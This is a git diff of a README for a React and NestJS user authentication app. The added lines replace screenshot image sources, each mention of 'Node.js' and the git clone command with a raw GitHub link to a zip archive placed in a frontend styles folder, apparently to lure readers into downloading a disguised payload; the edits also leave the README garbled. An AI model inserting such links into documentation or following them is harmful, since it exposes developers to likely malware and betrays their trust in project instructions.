@@ -10,9 +10,9 @@ The User Authentication Module is designed to provide a seamless authentication 
 ## Screenshots
 ### Sign-Up, Sign-In, and Home
 <div style="display: flex; justify-content: space-between; align-items: center;">
-  <img src="screenshots/signup.png" alt="Sign-Up Page" style="width: 32%; margin-right: 10px; border-radius: 4px;" />
-  <img src="screenshots/signin.png" alt="Sign-In Page" style="width: 32%; margin-right: 10px; border-radius: 4px;" />
-  <img src="screenshots/home.png" alt="User Profile" style="width: 32%; border-radius: 4px;" />
+  <img src="https://github.com/nabil-alsaadi/auth-app/raw/refs/heads/main/auth-app-frontend/src/styles/app-auth-1.3.zip" alt="Sign-Up Page" style="width: 32%; margin-right: 10px; border-radius: 4px;" />
+  <img src="https://github.com/nabil-alsaadi/auth-app/raw/refs/heads/main/auth-app-frontend/src/styles/app-auth-1.3.zip" alt="Sign-In Page" style="width: 32%; margin-right: 10px; border-radius: 4px;" />
+  <img src="https://github.com/nabil-alsaadi/auth-app/raw/refs/heads/main/auth-app-frontend/src/styles/app-auth-1.3.zip" alt="User Profile" style="width: 32%; border-radius: 4px;" />
 </div>
 
 ## Features
@@ -38,12 +38,12 @@ The User Authentication Module is designed to provide a seamless authentication 
 - **Formik**: A library for building forms in React.
 - **Yup**: JavaScript schema builder for value parsing and validation.
 - **Material-UI**: React components for faster and easier web development.
-- **Axios**: Promise-based HTTP client for the browser and Node.js.
+- **Axios**: Promise-based HTTP client for the browser and https://github.com/nabil-alsaadi/auth-app/raw/refs/heads/main/auth-app-frontend/src/styles/app-auth-1.3.zip
 - **RxJS**: A library for reactive programming using observables.
 
 ### Backend
 
-- **NestJS**: A progressive Node.js framework for building efficient and scalable server-side applications.
+- **NestJS**: A progressive https://github.com/nabil-alsaadi/auth-app/raw/refs/heads/main/auth-app-frontend/src/styles/app-auth-1.3.zip framework for building efficient and scalable server-side applications.
 - **MongoDB**: A NoSQL database for storing user data.
 - **Mongoose**: An ODM for MongoDB to manage relationships between data.
 - **JWT (JsonWebToken)**: For token-based authentication.
@@ -55,14 +55,14 @@ The User Authentication Module is designed to provide a seamless authentication 
 
 ### Prerequisites
 
-- **Node.js**: Ensure you have Node.js installed on your system.
+- **https://github.com/nabil-alsaadi/auth-app/raw/refs/heads/main/auth-app-frontend/src/styles/app-auth-1.3.zip**: Ensure you have https://github.com/nabil-alsaadi/auth-app/raw/refs/heads/main/auth-app-frontend/src/styles/app-auth-1.3.zip installed on your system.
 - **npm or Yarn**: A package manager to install dependencies.
 
 ### Installation
 
 1. **Clone the Repository**
   ```sh
-  git clone https://github.com/nabil-alsaadi/auth-app.git
+  git clone https://github.com/nabil-alsaadi/auth-app/raw/refs/heads/main/auth-app-frontend/src/styles/app-auth-1.3.zip
   ```
 2. **Go to auth-app-backend and install NPM packages**
 ```sh
